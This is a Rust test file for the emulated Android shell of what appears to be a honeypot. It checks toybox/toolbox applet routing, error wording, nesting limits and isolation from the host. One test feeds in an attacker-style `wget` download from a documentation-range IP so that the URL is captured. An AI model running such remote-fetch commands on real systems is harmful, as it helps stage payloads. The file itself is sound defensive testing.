//! `toybox` and `toolbox` through `handle_input`. No applet list was captured for the device, so
//! the lists are checked against the filesystem listing the persona already advertises, and the
//! routing against the plain commands it must agree with; not-found wording is `[unverified]`.

use super::multicall::{TOOLBOX_APPLETS, TOYBOX_APPLETS};
use super::{BudgetHit, CommandResult, EmitContext, FakeShell, HandlerId, OutputFd};
use crate::fakefs::FakeFs;

fn ctx() -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: "adb".to_string(),
        session_id: None,
    }
}

fn android() -> FakeShell {
    FakeShell::android(FakeFs::android(), ctx())
}

fn bash() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx())
}

fn stream(out: &CommandResult, fd: OutputFd) -> String {
    let bytes: Vec<u8> = out
        .output
        .iter()
        .filter(|segment| segment.fd == fd)
        .flat_map(|segment| segment.bytes.iter().copied())
        .collect();
    String::from_utf8(bytes).unwrap()
}

/// `(stdout, stderr, status)` of one line.
fn answer(sh: &mut FakeShell, line: &str) -> (String, String, u8) {
    let out = sh.handle_input(line).0;
    (
        stream(&out, OutputFd::Stdout),
        stream(&out, OutputFd::Stderr),
        out.status,
    )
}

fn out(sh: &mut FakeShell, line: &str) -> String {
    answer(sh, line).0
}

#[test]
fn toybox_runs_a_modeled_applet_as_the_plain_command_does() {
    let mut sh = android();
    assert_eq!(
        answer(&mut sh, "toybox uname -m"),
        ("armv7l\n".into(), "".into(), 0)
    );
    for line in [
        "ls /",
        "cat /system/build.prop",
        "echo hi there",
        "ls /nope",
    ] {
        let plain = answer(&mut sh, line);
        assert_eq!(answer(&mut sh, &format!("toybox {line}")), plain, "{line}");
        assert_eq!(
            answer(&mut sh, &format!("/system/bin/toybox {line}")),
            plain,
            "{line}"
        );
    }
    assert!(
        out(&mut sh, "toybox cat /system/build.prop").contains("ro.product.cpu.abi=armeabi-v7a")
    );
    assert!(out(&mut sh, "toybox ls /").contains("system"));
}

#[test]
fn toolbox_routes_to_the_same_handlers() {
    let mut sh = android();
    assert_eq!(
        answer(&mut sh, "toolbox getprop ro.product.model"),
        ("Nexus 5\n".into(), "".into(), 0)
    );
    assert_eq!(out(&mut sh, "toolbox ls /"), out(&mut sh, "ls /"));
    assert_eq!(answer(&mut sh, "toolbox setprop x.y z").2, 0);
    assert_eq!(out(&mut sh, "getprop x.y"), "z\n");
    assert_eq!(out(&mut sh, "toolbox uname -m"), "armv7l\n");
}

#[test]
fn an_unknown_applet_gets_each_binarys_not_found_form() {
    let mut sh = android();
    assert_eq!(
        answer(&mut sh, "toybox frobnicate"),
        ("".into(), "toybox: Unknown command frobnicate\n".into(), 1)
    );
    assert_eq!(
        answer(&mut sh, "toolbox frobnicate x"),
        ("".into(), "toolbox: no such tool frobnicate\n".into(), 1)
    );
    // A name the shell models only for the Ubuntu persona is not an applet on the phone.
    assert_eq!(
        answer(&mut sh, "toybox head -n1 /system/build.prop").1,
        "toybox: Unknown command head\n"
    );
}

#[test]
fn a_listed_applet_without_a_model_succeeds_silently() {
    let mut sh = android();
    for name in TOYBOX_APPLETS {
        let (stdout, stderr, status) = answer(&mut sh, &format!("toybox {name}"));
        assert!(
            !stderr.contains("Unknown command"),
            "`toybox {name}` contradicts the listing: {stderr:?}"
        );
        assert_eq!(status, 0, "toybox {name}");
        let _ = stdout;
    }
    for name in TOOLBOX_APPLETS {
        let (_, stderr, _) = answer(&mut sh, &format!("toolbox {name} ro.build.id"));
        assert!(
            !stderr.contains("no such tool"),
            "toolbox {name}: {stderr:?}"
        );
    }
    // No handler answers `reboot` on the phone, so it runs as the silent success BusyBox gives a
    // listed applet nothing models.
    assert_eq!(answer(&mut sh, "toybox reboot"), ("".into(), "".into(), 0));
}

#[test]
fn a_bare_binary_lists_the_advertised_applets() {
    let mut sh = android();
    let (toybox, err, status) = answer(&mut sh, "toybox");
    assert_eq!((err.as_str(), status), ("", 0));
    assert_eq!(
        toybox,
        "cat\nchmod\ndate\ndf\ndu\nenv\nfree\nhostname\nls\nmount\nnetstat\nping\nreboot\nroute\numount\nuptime\n"
    );
    assert_eq!(
        answer(&mut sh, "toolbox"),
        ("getprop\nsetprop\nps\ntop\nifconfig\n".into(), "".into(), 0)
    );
}

/// The lists are the persona's own `/system/bin`, not an invented set: every name in them is
/// advertised there, and every advertised name is an applet or a named standalone file.
#[test]
fn the_applet_lists_are_the_advertised_system_bin() {
    let advertised = FakeFs::android().list_dir("/system/bin").unwrap();
    for name in TOYBOX_APPLETS.iter().chain(TOOLBOX_APPLETS.iter()) {
        assert!(
            advertised.iter().any(|a| a == name),
            "{name} not advertised"
        );
    }
    assert!(
        TOYBOX_APPLETS.iter().all(|n| !TOOLBOX_APPLETS.contains(n)),
        "a name belongs to one binary"
    );
    // The advertised files that are not applets of either binary.
    let standalone = [
        "am",
        "app_process",
        "dalvikvm",
        "dumpsys",
        "getenforce",
        "ip",
        "linker",
        "logcat",
        "pm",
        "screencap",
        "sh",
        "toolbox",
        "toybox",
        "wm",
    ];
    for name in &advertised {
        let known = TOYBOX_APPLETS.contains(&name.as_str())
            || TOOLBOX_APPLETS.contains(&name.as_str())
            || standalone.contains(&name.as_str());
        assert!(known, "{name} is advertised but unclassified");
    }
    assert_eq!(
        advertised.len(),
        TOYBOX_APPLETS.len() + TOOLBOX_APPLETS.len() + standalone.len()
    );
}

#[test]
fn only_a_bare_applet_name_routes_and_the_other_binaries_are_refused() {
    let mut sh = android();
    for (line, wrong) in [
        ("toybox /bin/ls /", "toybox: Unknown command /bin/ls\n"),
        (
            "toybox busybox echo hi",
            "toybox: Unknown command busybox\n",
        ),
        (
            "toybox toolbox getprop",
            "toybox: Unknown command toolbox\n",
        ),
        ("toybox su", "toybox: Unknown command su\n"),
        ("toolbox toybox ls /", "toolbox: no such tool toybox\n"),
        ("toolbox busybox echo hi", "toolbox: no such tool busybox\n"),
        // Builtins that change the shell are not applets, so they do not run nested.
        ("toybox cd /data", "toybox: Unknown command cd\n"),
        ("toybox exit", "toybox: Unknown command exit\n"),
        ("toybox enable", "toybox: Unknown command enable\n"),
    ] {
        assert_eq!(
            answer(&mut sh, line),
            ("".into(), wrong.into(), 1),
            "{line}"
        );
    }
    assert_eq!(
        out(&mut sh, "pwd"),
        "/\n",
        "`toybox cd` did not move the shell"
    );
    // The fetchers are not toybox's, so the reply is not-found; the attempted URL is still
    // captured, because that capture reads the line and not the dispatch result.
    let (result, events) = sh.handle_input("toybox wget -q http://203.0.113.9/x");
    assert_eq!(
        stream(&result, OutputFd::Stderr),
        "toybox: Unknown command wget\n"
    );
    assert!(
        events
            .iter()
            .any(|e| e.metadata["url"] == "http://203.0.113.9/x"),
        "{events:?}"
    );
}

#[test]
fn nesting_is_bounded_by_the_depth_cap() {
    let mut sh = android();
    let line = format!("{}echo hi", "toybox ".repeat(40));
    let (result, _) = sh.handle_input(&line);
    assert_eq!(result.status, 1);
    assert!(result.is_empty(), "the refusal is silent");
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Depth));
    assert_eq!(sh.last_trace().budget.max_depth_reached, 16);
    // Inside the cap the chain still reaches the applet.
    assert_eq!(out(&mut sh, "toybox toybox toybox echo hi"), "hi\n");
}

#[test]
fn the_ubuntu_shell_has_neither_binary() {
    let mut sh = bash();
    for line in [
        "toybox uname -m",
        "toolbox ls",
        "toybox",
        "command -v toybox",
    ] {
        let (stdout, _, status) = answer(&mut sh, line);
        assert_eq!(stdout, "", "{line}");
        assert_ne!(status, 0, "{line}");
    }
    let (_, stderr, status) = answer(&mut sh, "toybox uname -m");
    assert_eq!(status, 127);
    assert!(stderr.contains("not found"), "{stderr}");
    assert_eq!(answer(&mut sh, "toolbox").2, 127);
}

/// They are real nodes of the phone, so the lookup commands find them and agree with dispatch.
#[test]
fn the_lookup_commands_find_the_binaries_on_the_phone() {
    let mut sh = android();
    for name in ["toybox", "toolbox"] {
        assert_eq!(
            answer(&mut sh, &format!("command -v {name}")),
            (format!("/system/bin/{name}\n"), "".into(), 0)
        );
        assert!(out(&mut sh, "ls /system/bin").contains(name));
    }
}

#[test]
fn the_decision_is_recorded_with_the_applet_nested_under_it() {
    let mut sh = android();
    sh.handle_input("toybox uname -m");
    let trace = sh.last_trace();
    let command = trace.segments[0].command.as_ref().unwrap();
    assert_eq!(command.resolved, HandlerId::Toybox);
    assert_eq!(command.reentry.len(), 1);
    assert_eq!(command.reentry[0].resolved, HandlerId::Uname);
    sh.handle_input("toolbox getprop ro.build.id");
    let command = sh.last_trace().segments[0].command.as_ref().unwrap();
    assert_eq!(command.resolved, HandlerId::Toolbox);
    assert_eq!(command.reentry[0].resolved, HandlerId::Getprop);
}

/// Routing only: nothing a `toybox` line does reaches past the filesystem the session already
/// has, and the module's source holds no process, socket or file API of its own.
#[test]
fn routing_never_reaches_the_host() {
    let source = include_str!("multicall.rs");
    for banned in ["std::fs", "std::process", "std::net", "tokio", "libc"] {
        assert!(!source.contains(banned), "multicall.rs mentions {banned}");
    }
    let mut sh = android();
    sh.handle_input("echo '#!/system/bin/sh' > /data/local/tmp/p");
    assert_eq!(answer(&mut sh, "toybox chmod 755 /data/local/tmp/p").2, 0);
    // A script is only ever read: `toybox cat` prints it and runs nothing.
    assert_eq!(
        out(&mut sh, "toybox cat /data/local/tmp/p"),
        "#!/system/bin/sh\n"
    );
}
